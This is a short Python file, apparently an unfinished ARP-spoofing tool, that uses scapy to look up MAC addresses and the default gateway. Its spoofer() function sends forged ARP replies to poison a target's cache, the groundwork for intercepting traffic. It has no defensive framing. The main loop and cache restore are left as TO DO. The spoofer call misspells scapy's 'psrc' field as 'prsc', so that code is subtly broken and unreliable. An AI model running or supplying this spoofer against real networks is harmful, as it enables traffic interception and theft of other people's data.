import re
import time
import socket
import subprocess
import scapy.all as scapy


"""
----  TO DO:  ----
def restore_cache();
main loop;
"""

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request = ether_frame/arp_request

    response_list = scapy.srp(request, timeout=5, retry=1, verbose=False)[0]

    return response_list[0][1].hwsrc


def get_gateway():
    try:
        """sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(('8.8.8.8', 80))
        gateway_ip = sock.getsockname()
        print(gateway_ip)
        sock.close()"""

        """ipconfig = subprocess.check_output("ipconfig")
        print(ipconfig)
        default_gateway = re.findall("Gateway", ipconfig)
        print(default_gateway)"""

        gw = scapy.conf.route.route("0.0.0.0")[2]
        print(gw)

        return gw
    
    except Exception as e:
        print(str(e))


def spoofer(target, gateway):
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), prsc=gateway)
    scapy.send(packet, verbose=False)



if __name__ == '__main__':
    get_gateway()